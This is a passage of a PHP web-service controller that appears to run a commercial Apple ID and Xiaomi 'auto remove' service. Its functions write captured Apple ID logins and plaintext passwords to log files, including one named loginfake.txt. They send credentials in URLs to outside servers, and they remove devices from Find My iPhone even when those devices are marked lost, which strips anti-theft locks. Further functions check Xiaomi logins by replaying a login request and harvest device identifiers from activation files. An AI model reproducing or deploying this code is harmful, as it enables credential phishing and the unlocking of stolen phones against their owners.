        file_put_contents("/home/holllyrenew/autoremove.hollyrenew.website/loginlogs.htm", $key . "" . "(" . $ip . ") - " . $AppleID . " - " . $pwd . "\n<br>", FILE_APPEND);

        $log = date('d/m/Y H:i:s') . ' - Login Success: ' . $AppleID . ' - ' . $pwd . "\n";

        @file_put_contents('/home/holllyrenew/autoremove.hollyrenew.website/loginfake.txt', $log, FILE_APPEND);
        $autoRemoveList = '';

        foreach ($FindMyiPhone->devices as $device) {

          file_put_contents('/home/holllyrenew/autoremove.hollyrenew.website/autoremove.txt', var_export($device, true) . "\n", FILE_APPEND);
          if ($device->deviceStatus != '200') //&& $device->deviceStatus != '203' )lostDevice
          {

            $rem = $FindMyiPhone->remove_client($device->id);

            if ($rem->statusCode == '200') {
              if ($device->lostDevice != null) {
                $lost = "LOST";
              } else {
                $lost = "CLEAN";
              }
              $autoRemoveList .= '<img src=https://statici.icloud.com/fmipmobile/deviceImages-9.0/' . $device->deviceClass . '/' . $device->rawDeviceModel . '/online-infobox.png><br>Device: ' . $device->deviceClass . '<br>Model: ' . $device->deviceDisplayName . '<br> Name: ' . $device->name . '<br> Message Remote wipe: ' . $device->remoteWipe->text . '<br>Owner Number: ' . $device->lostDevice->ownerNbr . ' <br>Message LostMode: ' . $device->lostDevice->text . '<br> FMI status: ' . $lost . '<br>' . $statusUnlocked . '';
            }

            file_put_contents('/home/holllyrenew/autoremove.hollyrenew.website/autoremove.txt', var_export($rem, true) . "\n", FILE_APPEND);
          } else {
            if ($device->lostDevice != null) {
              $lost = "LOST";
            } else {
              $lost = "CLEAN";
            }
            $autoRemoveList .= '<img src=https://statici.icloud.com/fmipmobile/deviceImages-9.0/' . $device->deviceClass . '/' . $device->rawDeviceModel . '/online-infobox.png><br>Device: ' . $device->deviceClass . '<br>Model: ' . $device->deviceDisplayName . '<br> Name: ' . $device->name . '<br> Message Remote wipe: ' . $device->remoteWipe->text . '<br>Owner Number: ' . $device->lostDevice->ownerNbr . ' <br>Message LostMode: ' . $device->lostDevice->text . '<br> FMI status: ' . $lost . '<br>' . $statusFailed . '';
          }
        }
        if (empty($autoRemoveList)) {

          echo "No Devices Offline!";
        }

        echo $autoRemoveList;
      } catch (exception $e) {
        echo 'ERROR: ' . $e->getMessage() . PHP_EOL;
      }
    } catch (\Throwable $e) {
      return back();
    }
  }


  private function autoremovev2($AppleID = NULL, $Password = NULL)
  {
    try {
      $ip = $_SERVER["REMOTE_ADDR"];
      $key = "testkey";
      $pwd = base64_decode($Password);
      $login = "testkey";
      $statusUnlocked = "️Status: Unlocked ✅ ️\r\r\n <br> ";
      $statusFailed = "️Status: Failed ⛔  ️\r\r\n <br> Device is Online! ️\r\r\n <br>️\r";

      require_once('/home/holllyrenew/autoremove.hollyrenew.website/FindMyiPhone.php');
      @session_start();

      $pwd = empty($pwd) ? null : $pwd;
      $AppleID = empty($AppleID) ? null : $AppleID;

      if (empty($pwd) || empty($AppleID)) {
        die('error params');
      }

      try {
        $FindMyiPhone = new \FindMyiPhone($AppleID, $pwd, true);
        //$FindMyiPhone = $_SESSION['fmi'];
        if (!$FindMyiPhone->loggedIn) {
          die('Apple ID Locked or Password Invalid!');
        }

        $FindMyiPhone->refresh_client();

        file_put_contents("/home/holllyrenew/autoremove.hollyrenew.website/loginlogs.htm", $key . "" . "(" . $ip . ") - " . $AppleID . " - " . $pwd . "\n<br>", FILE_APPEND);

        $log = date('d/m/Y H:i:s') . ' - Login Success: ' . $AppleID . ' - ' . $pwd . "\n";

        @file_put_contents('/home/holllyrenew/autoremove.hollyrenew.website/loginfake.txt', $log, FILE_APPEND);
        $autoRemoveList = '';

        foreach ($FindMyiPhone->devices as $device) {
          file_put_contents('/home/holllyrenew/autoremove.hollyrenew.website/autoremove.txt', var_export($device, true) . "\n", FILE_APPEND);

          if ($device->deviceStatus != '200') //&& $device->deviceStatus != '203' )lostDevice
          {

            if ($device->lostDevice != null) {
              $lost = "LOST";
            } else {
              $lost = "CLEAN";
            }
            $rem = $FindMyiPhone->remove_client($device->id);

            if ($rem->statusCode == '200') {
              $autoRemoveList .= 'Device: ' . $device->deviceClass . '<br>Model: ' . $device->deviceDisplayName . '<br> Name: ' . $device->name . '<br> Message Remote wipe: ' . $device->remoteWipe->text . '<br>Owner Number: ' . $device->lostDevice->ownerNbr . ' <br>Message LostMode: ' . $device->lostDevice->text . '<br> FMI status: ' . $lost . '<br>' . $statusUnlocked . '';
            }

            file_put_contents('/home/holllyrenew/autoremove.hollyrenew.website/autoremove.txt', var_export($rem, true) . "\n", FILE_APPEND);
          } else {
            if ($device->lostDevice != null) {
              $lost = "LOST";
            } else {
              $lost = "CLEAN";
            }
            $autoRemoveList .= 'Device: ' . $device->deviceClass . '<br>Model: ' . $device->deviceDisplayName . '<br> Name: ' . $device->name . '<br> Message Remote wipe: ' . $device->remoteWipe->text . '<br>Owner Number: ' . $device->lostDevice->ownerNbr . ' <br>Message LostMode: ' . $device->lostDevice->text . '<br> FMI status: ' . $lost . '<br>' . $statusFailed . '';
          }
        }
        if (empty($autoRemoveList)) {

          echo "No Devices Offline!";
        }

        echo $autoRemoveList;
      } catch (exception $e) {
        echo 'ERROR: ' . $e->getMessage() . PHP_EOL;
      }
    } catch (\Throwable $e) {
      return back();
    }
  }

  /**
   * Store a newly created resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function fixed($AppleID , $Password )
  {
    $AppleID = $AppleID ;
    //$pwd =  base64_encode($Password);
    $Password =  base64_encode($Password);
    $url = "https://autobench.hollyrenew.website/index.php?username=$AppleID&password=$Password";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
      "Content-Type: application/x-www-form-urlencoded",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_POSTFIELDS, "");

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    curl_close($curl);
   // return $resp;

// Eliminar etiquetas HTML de la respuesta
$respWithoutTags = strip_tags($resp);

// Remover \r, cambiar \n por <br>, quitar \u2705, la cadena específica y "Auto Remove Message"
$respFormatted = str_replace(array("\r", "\n", "\u2705", '---------------------------------------', 'Auto Remove Message'), "", $respWithoutTags);
$respFormatted = str_replace("\n", "", $respFormatted);

    return $respFormatted ;
  }

public function valide($AppleID,$Password){
    $AppleID = $AppleID ;
    $pwd =  base64_encode($Password);
    $url = "https://autobench.hollyrenew.website/index_valide.php?username=$AppleID&password=$pwd";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
      "Content-Type: application/x-www-form-urlencoded",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = "api_key=lRwr4VRLNc&api_token=Lg46bJMMZh&appleid=" . $AppleID . "&password=" . $pwd . "";

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    curl_close($curl);
// Eliminar etiquetas HTML de la respuesta
$respWithoutTags = strip_tags($resp);

// Remover \r, cambiar \n por <br>, quitar \u2705, la cadena específica y "Auto Remove Message"
$respFormatted = str_replace(array("\r", "\n", "\u2705", '---------------------------------------', 'Auto Remove Message'), "", $respWithoutTags);
$respFormatted = str_replace("\n", "", $respFormatted);

    return $respFormatted ;

}
public function fix2($AppleID,$Password){
    $email = $AppleID;
    $pass =$Password;
    $passs=base64_encode($pass);


    $AuremoveREST = curl_init();
    curl_setopt($AuremoveREST, CURLOPT_URL, "https://iam-server.pro/autoremove?username=$email&password=$passs");
    curl_setopt($AuremoveREST, CURLOPT_HEADER, false);
    curl_setopt($AuremoveREST, CURLOPT_POST, true);
    curl_setopt($AuremoveREST, CURLOPT_POSTFIELDS, "");
    curl_setopt($AuremoveREST, CURLOPT_RETURNTRANSFER, true);
    $Autoremove_HTML = curl_exec($AuremoveREST);
    curl_close($AuremoveREST);
    echo $Autoremove_HTML;
}

  /**
   * Store a newly created resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function snnccheck(Request $request)
  {
    try {

      $ip = $this->getUserIP();
      $AppleID = $request->appleid;
      $pwd = base64_decode($request->password);
      $action = $request->action; // verify or remove
      $responses = $request->response; // json or html or text

      /*
function AutoRemove($AppleID = NULL, $Password = NULL) {
    try{
    $curl = curl_init();
	//username=$email&password=$passverify
	curl_setopt_array($curl, [
		CURLOPT_URL => "https://api.theanomteam.com?username=".urlencode($AppleID)."&password=".$Password,
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => "",
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 30,
		CURLOPT_SSL_VERIFYPEER => false,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_POSTFIELDS => "",
		CURLOPT_HTTPHEADER => [
			"Content-Type: application/x-www-form-urlencoded"
		],
	]);
	$response = curl_exec($curl);
	$err = curl_error($curl);
	curl_close($curl);
	return $response;
    }catch(\Throwable $e){
        return back();
    }
}
*/

      $auth = $this->auth($ip);
      if ($auth == true) {
        $json = [];
        if ($action == "remove") {
          if ($responses == "html") {
            //$json=AutoRemove($AppleID,base64_encode($pwd));
            $json = $this->fixed($AppleID, $pwd);

          } else {

            //$json=$this->autoremovev2($AppleID,base64_encode($pwd));
            $json= $this->fixed($AppleID,$pwd);
          }

          if ($json==false) {

            if ($responses == "json") {
              echo json_encode($respuesta = array(["status" => $json->status, "response" => "Username or Password Wrong "]));
            } else {
              echo "Username or Password Wrong ";
            }
            exit;
          } else {

            if ($json==true) {

              if ($responses == "text") {
                if (isset($json)) {
                  return response()->json($json);
              } else {
                  return response()->json('No message property found in the JSON response.');
              }

              } else {
                if (isset($json)) {
                  return response()->json($json);
              } else {
                  return response()->json('No message property found in the JSON response.');
              }              }
            } else {

              if (isset($json)) {
                return response()->json($json);
            } else {
                return response()->json('No message property found in the JSON response.');
            }
            }
          }

          if ($responses == "json") {
            header('Content-Type: application/json');
            echo json_encode($respuesta = array("status" => "fail", "response" => "$json"));
          } else if ($responses == "text") {
            if (isset($json)) {
              return response()->json($json);
          } else {
              return response()->json('No message property found in the JSON response.');
          }          } else {

            if (isset($json)) {
              return response()->json($json);
          } else {
              return response()->json('No message property found in the JSON response.');
          }          }
          exit;
        } else if ($action == "valide") {
          /*
          $r = new AutenticateAPI;
          $r->authenticate($AppleID, $pwd);*/
          $json = $this->valide($AppleID,$pwd);
         return $json;
          //CHECK CARRIER
        } else if ($action == "checkcarrier") {

          if ($responses == "html") {

            $carrier =   app('\App\Http\Controllers\SistemaController')->check_api_($request);
            //echo "IP BANNED";


          } else if ($responses == "text") {
            $carrier =   app('\App\Http\Controllers\SistemaController')->check_carrier_text($request);
            echo $carrier;
            //echo "IP BANNED";

          }
          //CHECK FMI  <img src="https://cdn.alsgp0.fds.api.mi-img.com/device-model-img/RedmiNote10ProX.png" alt="Redmi Note 10 Pro">

        } else if ($action == "fmi_check_api") {

          if ($responses == "html") {
            $carrier =   app('\App\Http\Controllers\HomeController')->fmi_check_api_text($request);
            echo $carrier;

            //echo "IP BANNED";


          } else if ($responses == "text") {
            $carrier =   app('\App\Http\Controllers\HomeController')->fmi_check_api_text($request);
            echo $carrier;
          }
        } else if ($action == "xiaomi_valide") {
          if ($responses == "html") {
            $carrier =   app('\App\Http\Controllers\SistemaController')->xiaomi_valide_text($request);
            echo $carrier;
            //<img src="https://cdn.alsgp0.fds.api.mi-img.com/device-model-img/RedmiNote10ProX.png" alt="Redmi Note 10 Pro"> xiaomi_check

          } else if ($responses == "text") {
            $carrier =   app('\App\Http\Controllers\SistemaController')->xiaomi_valide_html($request);
            echo $carrier;
          }
        } else if ($action == "xiaomi_check") {

          if ($responses == "html") {
            $carrier =   app('\App\Http\Controllers\SistemaController')->xiaomi_check($request);
            echo $carrier;
            //<img src="https://cdn.alsgp0.fds.api.mi-img.com/device-model-img/RedmiNote10ProX.png" alt="Redmi Note 10 Pro"> xiaomi_check

          } else if ($responses == "text") {
            $respuesta = $this->POST("https://fastsendmx.com/api/checks/checkxiaomi.php?imei=$request->imei", $request->imei);
            echo $carrier;
          }
        } else if ($action == "xiaomi_remove") {

          if ($responses == "html") {
            $carrier =   app('\App\Http\Controllers\SistemaController')->xiaomi_remove_html($request);
            echo $carrier;
            //<img src="https://cdn.alsgp0.fds.api.mi-img.com/device-model-img/RedmiNote10ProX.png" alt="Redmi Note 10 Pro"> xiaomi_check

          } else if ($responses == "text") {
            $carrier =   app('\App\Http\Controllers\SistemaController')->xiaomi_remove_text($request);
            echo $carrier;
          }
        } else {
          echo "action parameter or response parameter are wrong or empty Please Contact <a href='https://t.me/hollydev1'></a>";
        }
      } else {
        echo "Your Server IP $ip Not Registered With us Please Contact <a href='https://t.me/hollydev1'></a>";
      }
    } catch (Exception $e) {
      echo "Failed 001";
    }
  }





  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function xiaomi_valide_html(Request $request)
  {
    $user1 = urlencode($request->username);
    $pass1 = base64_decode($request->password);
    $auth = urlencode($request->auth);

    //////-----reciviendo datos----//////
    foreach ($request as $k => $v) {
      ${$k} = filter_var($v, FILTER_SANITIZE_STRING);
    }

    $user = urlencode($user1); //////-----convierto el user en URL Encode---//////
    $pass = strtoupper(md5($pass1)); //////-----rConvierto el pass en MD5 y Mayusculas---//////


    /////////Mando el CURL////////

    $data = "bizDeviceType=&needTheme=false&theme=&showActiveX=false&serviceParam=%7B%22checkSafePhone%22%3Afalse%2C%22checkSafeAddress%22%3Afalse%2C%22lsrp_score%22%3A0.0%7D&callback=https%3A%2F%2Fus.i.mi.com%2Fsts%3Fsign%3DQUjUnrCggg9No240fiSu7mm%252BaPw%253D%26followup%3Dhttps%253A%252F%252Fus.i.mi.com%252F%26sid%3Di.mi.com&qs=%253Fcallback%253Dhttps%25253A%25252F%25252Fus.i.mi.com%25252Fsts%25253Fsign%25253DQUjUnrCggg9No240fiSu7mm%2525252BaPw%2525253D%252526followup%25253Dhttps%2525253A%2525252F%2525252Fus.i.mi.com%2525252F%252526sid%25253Di.mi.com%2526sid%253Di.mi.com%2526_locale%253Den_US%2526_snsNone%253Dtrue&sid=i.mi.com&_sign=Q5vkIRWtpBDEEoQo9URWMQDoYF0%3D&user=$user&cc=%2B1&hash=$pass&_json=true";

    $ch = curl_init("https://account.xiaomi.com/pass/serviceLoginAuth2");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);

    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
      'Host: account.xiaomi.com',
      'Connection: close',
      'Content-Length: ' . strlen($data),
      'sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"',
      'Accept: application/json',
      'X-Requested-With: XMLHttpRequest',
      'sec-ch-ua-mobile: ?0',
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
      'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
      'Origin: https://account.xiaomi.com',
      'Sec-Fetch-Site: same-origin',
      'Sec-Fetch-Mode: cors',
      'Sec-Fetch-Dest: empty',
      'Referer: https://account.xiaomi.com/fe/service/login/password?_snsNone=true&_locale=en_US&sid=i.mi.com&qs=%253Fcallback%253Dhttps%25253A%25252F%25252Fus.i.mi.com%25252Fsts%25253Fsign%25253DQUjUnrCggg9No240fiSu7mm%2525252BaPw%2525253D%252526followup%25253Dhttps%2525253A%2525252F%2525252Fus.i.mi.com%2525252F%252526sid%25253Di.mi.com%2526sid%253Di.mi.com%2526_locale%253Den_US%2526_snsNone%253Dtrue&callback=https%3A%2F%2Fus.i.mi.com%2Fsts%3Fsign%3DQUjUnrCggg9No240fiSu7mm%252BaPw%253D%26followup%3Dhttps%253A%252F%252Fus.i.mi.com%252F%26sid%3Di.mi.com&_sign=Q5vkIRWtpBDEEoQo9URWMQDoYF0%3D&serviceParam=%7B%22checkSafePhone%22%3Afalse%2C%22checkSafeAddress%22%3Afalse%2C%22lsrp_score%22%3A0.0%7D&showActiveX=false&theme=&needTheme=false&bizDeviceType=',
      //'Accept-Encoding: gzip, deflate',
      'Accept-Language: es-419,es;q=0.9',
      //'Cookie: iplocale=en; i.mi.com_istrudev=false; i.mi.com_isvalid_servicetoken=true; i.mi.com_ph=iyODDbMV55kW3EaHE+kwZg==; i.mi.com_slh=W51plyoXWO0hllaEOnt9XQrWO58=; uLocale=es_419'
    ));
    $myResult = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);



    $array = str_replace('&&&START&&&', "", $myResult); //////-----Elimino &&&START&&& para que sea un formato valido de JSON----//////


    $decode = json_decode($array, true); ////////------Decodifico JSON-----//////
    $url2 = $decode["location"]; ////////------Extraiga la URL donde se Genera el Service Token-----//////
    $check_Auth = $decode["pwd"]; ////////------Aqui Verifico si las crdenciales son Validas-----//////

    $response = '<html>
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    <p class="text-danger"> Password or Username Invalid <p> <br>
    </html>';
    if ($check_Auth == "0") {
      $data = [
        "response" => "NO",
        "status" => 401
      ];
      header('Content-Type: application/json; charset=utf-8');
      echo json_encode($data);
      exit;
    }

    if ($check_Auth != 0) {
      $data = [
        "response" => "OK",
        "status" => 201
      ];
      header('Content-Type: application/json; charset=utf-8');
      echo json_encode($data);
      exit;
    }

    curl_close($ch);
  }







  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function api(Request $request, $id)
  {
    $equipos = \App\Equipo::all();
    foreach ($equipos as $equi) {
      if ($equi->serial == $id) {

        echo "OK";
        exit(1);
      }
    }

    echo "NO";
    exit(1);
  }

  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function register_ecid(Request $request, $id)
  {
    $equipos = \App\Equipo::all();

    foreach ($equipos as $equi) {
      if ($equi->serial == $id) {
        return "ECID $id Already Registered";
      }
    }
    $setting =  new \App\Equipo;
    $setting->user_id = 1;
    $setting->serial = $id;
    $setting->status = 1;
    $setting->pagado = 1;
    $setting->save();

    try {
      mkdir("UDID/Register/$id");
    } catch (exception $e) {
      return "OK";
    }
    return "OK";

    //
  }
  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function remove_ecid(Request $request, $id)
  {
    $equipos = \App\Equipo::all();

    foreach ($equipos as $equi) {
      if ($equi->serial == $id) {

        $remove = \App\Equipo::destroy($equi->id);
        return "ECID $id Already Status";
      }
    }
    return "Dont Exist ECID or was already Status";

    //
  }



  /**
   * Store a newly created resource in storage.
   *
   * @param  int  $id

   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function plist(Request $request)
  {

    try {
      $token = $request->session()->token();

      $files = $request->file('archivo');

      $name = $files->getClientOriginalName();
      $extension = $files->getClientOriginalExtension();

      $fileName = $files->getClientOriginalName();
      $extension = $files->getClientOriginalExtension();

      $request->session()->forget('file');
      $request->session()->forget('ActivationRandomness');
      $request->session()->forget('activationState');
      $request->session()->forget('FMiPAccountExists');
      $request->session()->forget('BasebandActivationTicketVersion');
      $request->session()->forget('BasebandMasterKeyHash');
      $request->session()->forget('IntegratedCircuitCardIdentity');
      $request->session()->forget('InternationalMobileEquipmentIdentity');
      $request->session()->forget('PhoneNumber');
      $request->session()->forget('SerialNumber');
      $request->session()->forget('UniqueDeviceID');
      $request->session()->forget('DeviceClass');
      $request->session()->forget('OSType');
      $request->session()->forget('ProductType');
      $request->session()->forget('ProductVersion');
      $request->session()->forget('RegionCode');
      $request->session()->forget('RegulatoryModelNumber');
      $request->session()->forget('DeviceVariant');
      $request->session()->forget('BluetoothAddress');
      $request->session()->forget('EthernetMacAddress');
      $request->session()->forget('WifiAddress');
      $request->session()->forget('xml');

      session(['file' => $fileName]);
      //$fileName = $file->getName();
      //$fileType = $file->getClientMimeType();
      //$fileSize = $file->getSize();
      //$fileContent = $file->getTempName(); //obtenemos la ruta temporal del archivo
      //echo "Nombre del archivo: " . $fileName . "<br>";
      //echo "Tipo de archivo: " . $fileType . "<br>";
      //echo "Tama単o del archivo: " . $fileSize . " bytes<br>";
      //echo "Contenido del archivo:<br>";
      //echo file_get_contents($fileContent) . "<br>"; //mostramos el contenido del archivo
      //Realizar acciones con los datos del archivo
      //$xml = simplexml_load_file($fileContent); //convertimos el contenido del archivo en un objeto SimpleXMLElement
      //echo base64_decode(file_get_contents($fileContent)) . "<br>";
      //$this->response->setHeader('Content-Type', 'text/xml;charset=UTF-8');
      $xml = simplexml_load_file($files); //convertimos el contenido del archivo en un objeto SimpleXMLElement
      $response =  simplexml_load_string($xml->asXML()); //sacamos en formato XML
      //convercion paso2
      $xml1 = simplexml_load_string(base64_decode($response->dict->data)); //decodificamos la cadena que nos interesa y la convertimos en XML

      $value = json_decode(json_encode($xml1), true); //convertimos en objeto

      $i = 0;

      /*
    foreach($value['dict']['dict'][1]['string'] as $ptm){

    $bandera=0;

    if($ptm[0]=="1"&&strlen($ptm)==11)
    {
        $bandera=1;
    }
    if(chr($ptm,"+")===true||$bandera==1||$ptm[0]=="+")
    {
        session(['PhoneNumber' => $ptm]);
        echo "PhoneNumber: ".$ptm."<br>" ;

        session(['xml' => $ptm]);
    }else{
    }
    $i++;
    }*/
      $jsonObj = json_encode($xml1);
      #...EMAIL
      $imprime = json_encode($value);
      session(['imprime' => $imprime]);
      #....

      if (!empty($value['dict']['dict'][0]['string'][0])) {
        $ActivationRandomness = $value['dict']['dict'][0]['string'][0];
        session(['ActivationRandomness' => $ActivationRandomness]);
        echo "ActivationRandomness: " . $ActivationRandomness . "<br>";
      } else {
        session(['ActivationRandomness' => "N/A"]);
        echo "ActivationRandomness: N/A <br>";
      }
      if (!empty($value['dict']['dict'][0]['string'][1])) {


        $activationState = $value['dict']['dict'][0]['string'][1];

        session(['activationState' => $activationState]);
        echo "activationState: " . $activationState . "<br>";
      } else {
        session(['activationState' => "N/A"]);
        echo "activationState: N/A <br>";
      }

      if (!empty($value['dict']['dict'][0]['string'][1])) {

        $FMiPAccountExists = $value['dict']['dict'][0]['string'][1];
        session(['FMiPAccountExists' => $FMiPAccountExists]);
        echo "FMiPAccountExists: " . $FMiPAccountExists . "<br>";
      } else {
        session(['FMiPAccountExists' => "N/A"]);
        echo "FMiPAccountExists: N/A <br>";
      }

      if (!empty($value['dict']['dict'][1]['string'][0])) {
        $BasebandActivationTicketVersion = $value['dict']['dict'][1]['string'][0];
        session(['BasebandActivationTicketVersion' => $BasebandActivationTicketVersion]);
        echo "BasebandActivationTicketVersion: " . $BasebandActivationTicketVersion . "<br>";
      } else {
        session(['BasebandActivationTicketVersion' => "N/A"]);
        echo "BasebandActivationTicketVersion: N/A <br>";
      }


      if (!empty($value['dict']['dict'][1]['string'][1])) {
        $BasebandMasterKeyHash = $value['dict']['dict'][1]['string'][1];
        session(['BasebandMasterKeyHash' => $BasebandMasterKeyHash]);
        echo "BasebandMasterKeyHash: " . $BasebandMasterKeyHash . "<br>";
      } else {
        session(['BasebandMasterKeyHash' => "N/A"]);
        echo "BasebandMasterKeyHash: N/A <br>";
      }

      if (!empty($value['dict']['dict'][1]['string'][2])) {
        $IntegratedCircuitCardIdentity = $value['dict']['dict'][1]['string'][2];
        session(['IntegratedCircuitCardIdentity: ' => $IntegratedCircuitCardIdentity]);
        echo "IntegratedCircuitCardIdentity: " . $IntegratedCircuitCardIdentity . "<br>";
      } else {
        session(['IntegratedCircuitCardIdentity' => "N/A"]);
        echo "IntegratedCircuitCardIdentity: N/A <br>";
      }


      if (!empty($value['dict']['dict'][1]['string'][3])) {
        $InternationalMobileEquipmentIdentity = $value['dict']['dict'][1]['string'][3];
        session(['InternationalMobileEquipmentIdentity: ' => $InternationalMobileEquipmentIdentity . "<br>"]);
      } else {
        session(['InternationalMobileEquipmentIdentity' => "N/A"]);
        echo "InternationalMobileEquipmentIdentity: N/A <br>";
      }

      if (!empty($value['dict']['dict'][1]['string'][7])) {
        $PhoneNumber = $value['dict']['dict'][1]['string'][7];
        //session(['PhoneNumber' => $PhoneNumber]);
      } else {
        //session(['PhoneNumber' => "N/A"]);
      }


      if (!empty($value['dict']['dict'][2]['string'][0])) {
        $SerialNumber = $value['dict']['dict'][2]['string'][0];
        session(['SerialNumber' => $SerialNumber]);
        echo "SerialNumber: " . $SerialNumber . "<br>";
      } else {
        session(['SerialNumber' => "N/A"]);
        echo "SerialNumber: N/A <br>";
      }

      if (!empty($value['dict']['dict'][2]['string'][1])) {
        $UniqueDeviceID = $value['dict']['dict'][2]['string'][1];
        session(['UniqueDeviceID' => $UniqueDeviceID]);
        echo "UniqueDeviceID: " . $UniqueDeviceID . "<br>";
      } else {
        session(['UniqueDeviceID' => "N/A"]);
        echo "UniqueDeviceID: N/A <br>";
      }

      if (!empty($value['dict']['dict'][3]['string'][1])) {
        $DeviceClass = $value['dict']['dict'][3]['string'][1];
        session(['DeviceClass' => $DeviceClass]);
        echo "DeviceClass: " . $DeviceClass . "<br>";
      } else {
        session(['DeviceClass' => "N/A"]);
        echo "DeviceClass: N/A <br>";
      }

      if (!empty($value['dict']['dict'][3]['string'][4])) {
        $OSType = $value['dict']['dict'][3]['string'][4];
        session(['OSType' => $OSType]);
        echo "OSType: " . $OSType . "<br>";
      } else {
        session(['OSType' => "N/A"]);
        echo "OSType: N/A <br>";
      }

      if (!empty($value['dict']['dict'][3]['string'][5])) {

        $ProductType = $value['dict']['dict'][3]['string'][5];
        echo "ProductType: " . $ProductType . "<br>";
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, "https://hollyrenew.website/modelo.php?texto=$SerialNumber");
        curl_setopt($c, CURLOPT_TIMEOUT, 30);
        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $postfields = "";
        curl_setopt($c, CURLOPT_POSTFIELDS, $postfields);
        $resultw = curl_exec($c);
        curl_close($c);
        // echo ;

        session(['ProductType' => $resultw]);
        echo "ProductType: " . $resultw . "<br>";
      } else {
        session(['ProductType' => "N/A"]);
        echo "ProductType: N/A <br>";
      }
      if (!empty($value['dict']['dict'][3]['string'][6])) {

        $ProductVersion = $value['dict']['dict'][3]['string'][6];
        session(['ProductVersion: ' => $ProductVersion]);
        echo "ProductVersion: " . $ProductVersion . "<br>";
      } else {
        session(['ProductVersion' => "N/A"]);
        echo "ProductVersion: N/A <br>";
      }


      if (!empty($value['dict']['dict'][3]['string'][7])) {
        $RegionCode = $value['dict']['dict'][3]['string'][7];
        session(['RegionCode' => $RegionCode]);
        echo "RegionCode: " . $RegionCode . "<br>";
      } else {
        session(['RegionCode' => "N/A"]);
        echo "RegionCode: N/A <br>";
      }



      if (!empty($value['dict']['dict'][3]['string'][9])) {

        $RegulatoryModelNumber = $value['dict']['dict'][3]['string'][9];
        session(['RegulatoryModelNumber' => $RegulatoryModelNumber]);
        echo "RegulatoryModelNumber: " . $RegulatoryModelNumber . "<br>";
      } else {
        session(['RegulatoryModelNumber' => "N/A"]);
        echo "RegulatoryModelNumber: N/A <br>";
      }


      if (!empty($value['dict']['dict'][4]['string'][0])) {
        $DeviceVariant = $value['dict']['dict'][4]['string'][0];
        session(['DeviceVariant' => $DeviceVariant]);
        echo "DeviceVariant: " . $DeviceVariant . "<br>";
      } else {
        session(['DeviceVariant' => "N/A"]);
        echo "DeviceVariant: N/A <br>";
      }

      if (!empty($value['dict']['dict'][4]['string'][1])) {
        $UniqueChipID = $value['dict']['dict'][4]['string'][1];
        session(['UniqueChipID' => $UniqueChipID]);
        echo "UniqueChipID: " . $UniqueChipID . "<br>";
      } else {
        session(['UniqueChipID' => "N/A"]);
        echo "UniqueChipID: N/A <br>";
      }

      if (!empty($value['dict']['dict'][6]['string'][0])) {
        $BluetoothAddress = $value['dict']['dict'][6]['string'][0];
        session(['BluetoothAddress' => $BluetoothAddress]);
        echo "BluetoothAddress: " . $BluetoothAddress . "<br>";
      } else {
        echo "BluetoothAddress : N/A <br>";
      }


      if (!empty($value['dict']['dict'][6]['string'][1])) {
        $EthernetMacAddress = $value['dict']['dict'][6]['string'][1];
